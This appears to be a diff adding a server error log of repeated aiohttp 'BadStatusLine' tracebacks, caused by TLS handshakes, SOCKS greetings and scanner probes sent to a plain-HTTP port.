+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\xd2l\x84\xe5u\x98\x8dA\x85'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01'
+      ^
